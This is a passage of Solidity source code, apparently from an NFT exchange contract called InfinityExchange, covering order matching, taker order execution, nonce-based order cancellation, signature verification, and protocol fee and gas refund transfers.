attacks.\n  mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n\n  /// @dev Storage variable that keeps track of valid complications (order execution strategies)\n  EnumerableSet.AddressSet private _complications;\n  /// @dev Storate variable that keeps track of valid currencies (tokens)\n  EnumerableSet.AddressSet private _currencies;\n\n  event CancelAllOrders(address user, uint256 newMinNonce);\n  event CancelMultipleOrders(address user, uint256[] orderNonces);\n  event NewWethTransferGasUnits(uint32 wethTransferGasUnits);\n  event NewProtocolFee(uint16 protocolFee);\n\n  event MatchOrderFulfilled(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  event TakeOrderFulfilled(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  constructor(address _WETH, address _matchExecutor) {\n    // Calculate the domain separator\n    DOMAIN_SEPARATOR = keccak256(\n      abi.encode(\n        keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n        keccak256('InfinityExchange'),\n        keccak256(bytes('1')), // for versionId = 1\n        block.chainid,\n        address(this)\n      )\n    );\n    WETH = _WETH;\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  fallback() external payable {}\n\n  receive() external payable {}\n\n  // =================================================== USER FUNCTIONS =======================================================\n\n  /**\n   @notice Matches orders one to one where each order has 1 NFT. Example: Match 1 specific NFT buy with one specific NFT sell.\n   @dev Can execute orders in batches for gas efficiency. Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrders1 Maker order 1\n   @param makerOrders2 Maker order 2\n  */\n  function matchOneToOneOrders(\n    OrderTypes.MakerOrder[] calldata makerOrders1,\n    OrderTypes.MakerOrder[] calldata makerOrders2\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numMakerOrders = makerOrders1.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numMakerOrders == makerOrders2.length, 'mismatched lengths');\n\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    for (uint256 i = 0; i < numMakerOrders; ) {\n      uint256 startGasPerOrder = gasleft() + ((startGas - gasleft()) / numMakerOrders);\n      require(_complications.contains(makerOrders1[i].execParams[0]), 'invalid complication');\n      (bool canExec, uint256 execPrice) = IComplication(makerOrders1[i].execParams[0]).canExecMatchOneToOne(\n        makerOrders1[i],\n        makerOrders2[i]\n      );\n      require(canExec, 'cannot execute');\n      _matchOneToOneOrders(\n        makerOrders1[i],\n        makerOrders2[i],\n        startGasPerOrder,\n        execPrice,\n        protocolFeeBps,\n        wethTransferGasUnits,\n        weth\n      );\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.\n   @dev Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrder The one order to match\n   @param manyMakerOrders Array of multiple orders to match the one order against\n  */\n  function matchOneToManyOrders(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external {\n    uint256 startGas = gasleft();\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');\n    require(\n      IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),\n      'cannot execute'\n    );\n    bytes32 makerOrderHash = _hash(makerOrder);\n    require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');\n    uint256 ordersLength = manyMakerOrders.length;\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    if (makerOrder.isSellOrder) {\n      for (uint256 i = 0; i < ordersLength; ) {\n        // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status\n        uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);\n        _matchOneMakerSellToManyMakerBuys(\n          makerOrderHash,\n          makerOrder,\n          manyMakerOrders[i],\n          startGasPerOrder,\n          protocolFeeBps,\n          wethTransferGasUnits,\n          weth\n        );\n        unchecked {\n          ++i;\n        }\n      }\n      isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    } else {\n      uint256 protocolFee;\n      for (uint256 i = 0; i < ordersLength; ) {\n        protocolFee += _matchOneMakerBuyToManyMakerSells(\n          makerOrderHash,\n          manyMakerOrders[i],\n          makerOrder,\n          protocolFeeBps\n        );\n        unchecked {\n          ++i;\n        }\n      }\n      isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n      uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;\n      // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n      // else we need to send the protocol fee separately in the execution currency\n      // since the buyer is common across many sell orders, this part can be executed outside the above for loop\n      // in contrast to the case where if the one order is a sell order, we need to do this in each for loop\n      if (makerOrder.execParams[1] == weth) {\n        IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);\n      } else {\n        IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);\n        IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);\n      }\n    }\n  }\n\n  /**\n   @notice Matches orders one to one where no specific NFTs are specified. \n          Example: A collection wide buy order with any 2 NFTs with a sell order that has any 2 NFTs from that collection.\n   @dev Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n        The constructs param specifies the actual NFTs that will be executed since buys and sells need not specify actual NFTs - only \n        a higher level intent.\n   @param sells User signed sell orders\n   @param buys User signed buy orders\n   @param constructs Intersection of the NFTs in the sells and buys. Constructed by an off chain matching engine.\n  */\n  function matchOrders(\n    OrderTypes.MakerOrder[] calldata sells,\n    OrderTypes.MakerOrder[] calldata buys,\n    OrderTypes.OrderItem[][] calldata constructs\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numSells = sells.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numSells == buys.length && numSells == constructs.length, 'mismatched lengths');\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    for (uint256 i = 0; i < numSells; ) {\n      uint256 startGasPerOrder = gasleft() + ((startGas - gasleft()) / numSells);\n      (bool executionValid, uint256 execPrice) = IComplication(sells[i].execParams[0]).canExecMatchOrder(\n        sells[i],\n        buys[i],\n        constructs[i]\n      );\n      require(executionValid, 'cannot execute');\n      _matchOrders(\n        sells[i],\n        buys[i],\n        constructs[i],\n        startGasPerOrder,\n        execPrice,\n        protocolFeeBps,\n        wethTransferGasUnits,\n        weth\n      );\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   @notice Batch buys or sells orders with specific `1` NFTs. Transaction initiated by an end user.\n   @param makerOrders The orders to fulfill\n  */\n  function takeMultipleOneOrders(OrderTypes.MakerOrder[] calldata makerOrders) external payable nonReentrant {\n    uint256 numMakerOrders = makerOrders.length;\n    uint256 totalPrice;\n    address currency = makerOrders[0].execParams[1];\n    bool isMakerSeller = makerOrders[0].isSellOrder;\n    if (!isMakerSeller) {\n      require(currency != address(0), 'offers only in ERC20');\n    }\n    for (uint256 i = 0; i < numMakerOrders; ) {\n      bytes32 makerOrderHash = _hash(makerOrders[i]);\n      require(isOrderValid(makerOrders[i], makerOrderHash), 'invalid maker order');\n      bool isTimeValid = makerOrders[i].constraints[3] <= block.timestamp &&\n        makerOrders[i].constraints[4] >= block.timestamp;\n      require(isTimeValid, 'invalid time');\n      require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n      require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n      uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n      totalPrice += execPrice;\n      _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);\n      unchecked {\n        ++i;\n      }\n    }\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n  }\n\n  /**\n   @notice Batch buys or sells orders where maker orders can have unspecified NFTs. Transaction initiated by an end user.\n   @param makerOrders The orders to fulfill\n   @param takerNfts The specific NFTs that the taker is willing to take that intersect with the higher order intent of the maker\n   Example: If a makerOrder is 'buy any one of these 2 specific NFTs', then the takerNfts would be 'this one specific NFT'.\n  */\n  function takeOrders(OrderTypes.MakerOrder[] calldata makerOrders, OrderTypes.OrderItem[][] calldata takerNfts)\n    external\n    payable\n    nonReentrant\n  {\n    uint256 ordersLength = makerOrders.length;\n    require(ordersLength == takerNfts.length, 'mismatched lengths');\n    uint256 totalPrice;\n    address currency = makerOrders[0].execParams[1];\n    bool isMakerSeller = makerOrders[0].isSellOrder;\n    if (!isMakerSeller) {\n      require(currency != address(0), 'offers only in ERC20');\n    }\n    for (uint256 i = 0; i < ordersLength; ) {\n      require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n      require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n      uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n      totalPrice += execPrice;\n      _takeOrders(makerOrders[i], takerNfts[i], execPrice);\n      unchecked {\n        ++i;\n      }\n    }\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n  }\n\n  /**\n   @notice Helper function (non exchange related) to send multiple NFTs in one go\n   @param to The orders to fulfill\n   @param items The specific NFTs to transfer\n  */\n  function transferMultipleNFTs(address to, OrderTypes.OrderItem[] calldata items) external nonReentrant {\n    _transferMultipleNFTs(msg.sender, to, items);\n  }\n\n  /**\n   * @notice Cancel all pending orders\n   * @param minNonce minimum user nonce\n   */\n  function cancelAllOrders(uint256 minNonce) external {\n    require(minNonce > userMinOrderNonce[msg.sender], 'nonce too low');\n    require(minNonce < userMinOrderNonce[msg.sender] + 1000000, 'too many');\n    userMinOrderNonce[msg.sender] = minNonce;\n    emit CancelAllOrders(msg.sender, minNonce);\n  }\n\n  /**\n   * @notice Cancel multiple orders\n   * @param orderNonces array of order nonces\n   */\n  function cancelMultipleOrders(uint256[] calldata orderNonces) external {\n    uint256 numNonces = orderNonces.length;\n    require(numNonces > 0, 'cannot be empty');\n    for (uint256 i = 0; i < numNonces; ) {\n      require(orderNonces[i] >= userMinOrderNonce[msg.sender], 'nonce too low');\n      require(!isUserOrderNonceExecutedOrCancelled[msg.sender][orderNonces[i]], 'nonce already executed or cancelled');\n      isUserOrderNonceExecutedOrCancelled[msg.sender][orderNonces[i]] = true;\n      unchecked {\n        ++i;\n      }\n    }\n    emit CancelMultipleOrders(msg.sender, orderNonces);\n  }\n\n  // ====================================================== VIEW FUNCTIONS ======================================================\n\n  /**\n   * @notice Check whether user order nonce is executed or cancelled\n   * @param user address of user\n   * @param nonce nonce of the order\n   * @return whether nonce is valid\n   */\n  function isNonceValid(address user, uint256 nonce) external view returns (bool) {\n    return !isUserOrderNonceExecutedOrCancelled[user][nonce] && nonce > userMinOrderNonce[user];\n  }\n\n  /**\n   * @notice Check whether a user signed order has valid signature\n   * @param order the order to verify\n   * @return whether order has valid signature\n   */\n  function verifyOrderSig(OrderTypes.MakerOrder calldata order) external view returns (bool) {\n    // Verify the validity of the signature\n    (bytes32 r, bytes32 s, uint8 v) = abi.decode(order.sig, (bytes32, bytes32, uint8));\n    return SignatureChecker.verify(_hash(order), order.signer, r, s, v, DOMAIN_SEPARATOR);\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n   * @param sellOrderHash hash of the sell order\n   * @param buyOrderHash hash of the buy order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid\n   */\n  function verifyMatchOneToOneOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      isOrderValid(sell, sellOrderHash) &&\n      isOrderValid(buy, buyOrderHash));\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n   * @param orderHash hash of the order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid\n   */\n  function verifyMatchOneToManyOrders(\n    bytes32 orderHash,\n    bool verifySellOrder,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    bool _orderValid;\n    if (verifySellOrder) {\n      _orderValid = isOrderValid(sell, orderHash);\n    } else {\n      _orderValid = isOrderValid(buy, orderHash);\n    }\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      _orderValid);\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n          Also checks if the given complication can execute this order\n   * @param sellOrderHash hash of the sell order\n   * @param buyOrderHash hash of the buy order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid and the execution price\n   */\n  function verifyMatchOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      isOrderValid(sell, sellOrderHash) &&\n      isOrderValid(buy, buyOrderHash));\n  }\n\n  /**\n   * @notice Verifies the validity of the order\n   * @dev checks whether order nonce was cancelled or already executed, \n          if signature is valid and if the complication and currency are valid\n   * @param order the order\n   * @param orderHash computed hash of the order\n   */\n  function isOrderValid(OrderTypes.MakerOrder calldata order, bytes32 orderHash) public view returns (bool) {\n    bool orderExpired = isUserOrderNonceExecutedOrCancelled[order.signer][order.constraints[5]] ||\n      order.constraints[5] < userMinOrderNonce[order.signer];\n    // Verify the validity of the signature\n    (bytes32 r, bytes32 s, uint8 v) = abi.decode(order.sig, (bytes32, bytes32, uint8));\n    bool sigValid = SignatureChecker.verify(orderHash, order.signer, r, s, v, DOMAIN_SEPARATOR);\n    if (\n      orderExpired ||\n      !sigValid ||\n      order.signer == address(0) ||\n      !_complications.contains(order.execParams[0]) ||\n      !_currencies.contains(order.execParams[1])\n    ) {\n      return false;\n    }\n    return true;\n  }\n\n  /// @notice returns the number of complications supported by the exchange\n  function numComplications() external view returns (uint256) {\n    return _complications.length();\n  }\n\n  /// @notice returns the complication at the given index\n  function getComplicationAt(uint256 index) external view returns (address) {\n    return _complications.at(index);\n  }\n\n  /// @notice returns whether a given complication is valid\n  function isValidComplication(address complication) external view returns (bool) {\n    return _complications.contains(complication);\n  }\n\n  /// @notice returns the number of currencies supported by the exchange\n  function numCurrencies() external view returns (uint256) {\n    return _currencies.length();\n  }\n\n  /// @notice returns the currency at the given index\n  function getCurrencyAt(uint256 index) external view returns (address) {\n    return _currencies.at(index);\n  }\n\n  /// @notice returns whether a given currency is valid\n  function isValidCurrency(address currency) external view returns (bool) {\n    return _currencies.contains(currency);\n  }\n\n  // ====================================================== INTERNAL FUNCTIONS ================================================\n\n  /**\n   * @notice Internal helper function to match orders one to one\n   * @param makerOrder1 first order\n   * @param makerOrder2 second maker order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOneToOneOrders(\n    OrderTypes.MakerOrder calldata makerOrder1,\n    OrderTypes.MakerOrder calldata makerOrder2,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    OrderTypes.MakerOrder calldata sell = makerOrder1.isSellOrder ? makerOrder1 : makerOrder2;\n    OrderTypes.MakerOrder calldata buy = makerOrder1.isSellOrder ? makerOrder2 : makerOrder1;\n    bytes32 sellOrderHash = _hash(sell);\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOneToOneOrders(sellOrderHash, buyOrderHash, sell, buy), 'order not verified');\n    _execMatchOneToOneOrders(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      startGasPerOrder,\n      execPrice,\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function to match one maker sell order to many maker buys\n   * @param sellOrderHash sell order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOneToManyOrders(buyOrderHash, false, sell, buy), 'order not verified');\n    _execMatchOneMakerSellToManyMakerBuys(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      startGasPerOrder,\n      _getCurrentPrice(buy),\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function to match one maker buy order to many maker sells\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param protocolFeeBps exchange fee\n   */\n  function _matchOneMakerBuyToManyMakerSells(\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint16 protocolFeeBps\n  ) internal returns (uint256) {\n    bytes32 sellOrderHash = _hash(sell);\n    require(verifyMatchOneToManyOrders(sellOrderHash, true, sell, buy), 'order not verified');\n    return\n      _execMatchOneMakerBuyToManyMakerSells(\n        sellOrderHash,\n        buyOrderHash,\n        sell,\n        buy,\n        _getCurrentPrice(sell),\n        protocolFeeBps\n      );\n  }\n\n  /**\n   * @notice Internal helper function to match orders specified via a higher order intent\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param constructedNfts the nfts constructed by an off chain matching that are guaranteed to intersect\n            with the user specified signed intents (orders)\n   * @param startGasPerOrder start gas when this order started execution\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOrders(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    bytes32 sellOrderHash = _hash(sell);\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOrders(sellOrderHash, buyOrderHash, sell, buy), 'order not verified');\n    _execMatchOrders(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      constructedNfts,\n      startGasPerOrder,\n      execPrice,\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one to one orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Also refunds gas expenditure to the contract\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _execMatchOneToOneOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[sell.signer][sell.constraints[5]] = true;\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _transferMultipleNFTs(sell.signer, buy.signer, sell.nfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, sell.signer, remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one sell to many buy orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Also refunds gas expenditure to the contract\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _execMatchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one buy to many sell orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Gas expenditure refund is done in the caller\n          since it does not need to be done in a loop\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @return the protocolFee so that the buyer can pay the protocol fee and gas cost in one go\n   */\n  function _execMatchOneMakerBuyToManyMakerSells(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 execPrice,\n    uint16 protocolFeeBps\n  ) internal returns (uint256) {\n    isUserOrderNonceExecutedOrCancelled[sell.signer][sell.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, sell.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    return protocolFee;\n  }\n\n  /// @dev this helper purely exists to help reduce contract size a bit and avoid any stack too deep errors\n  function _execMatchOneToManyOrders(\n    address seller,\n    address buyer,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    address currency,\n    uint256 amount\n  ) internal {\n    _transferMultipleNFTs(seller, buyer, constructedNfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(currency).safeTransferFrom(buyer, seller, amount);\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match orders\n   * @dev Updates order nonce states, does asset transfers, emits events and does gas refunds\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param constructedNfts the constructed nfts\n   * @param startGasPerOrder gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth weth address\n   */\n  function _execMatchOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOrder(\n      sell.signer,\n      buy.signer,\n      sell.constraints[5],\n      buy.constraints[5],\n      constructedNfts,\n      buy.execParams[1],\n      remainingAmount\n    );\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /// @dev this helper purely exists to help reduce contract size a bit and avoid any stack too deep errors\n  function _execMatchOrder(\n    address seller,\n    address buyer,\n    uint256 sellNonce,\n    uint256 buyNonce,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    address currency,\n    uint256 amount\n  ) internal {\n    // Update order execution status to true (prevents replay)\n    isUserOrderNonceExecutedOrCancelled[seller][sellNonce] = true;\n    isUserOrderNonceExecutedOrCancelled[buyer][buyNonce] = true;\n    _transferMultipleNFTs(seller, buyer, constructedNfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(currency).safeTransferFrom(buyer, seller, amount);\n  }\n\n  function _emitMatchEvent(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication,\n    address currency,\n    uint256 amount\n  ) internal {\n    emit MatchOrderFulfilled(sellOrderHash, buyOrderHash, seller, buyer, complication, currency, amount);\n  }\n\n  /**\n   * @notice Internal helper function to take orders\n   * @dev verifies whether order can be executed\n   * @param makerOrder the maker order\n   * @param takerItems nfts 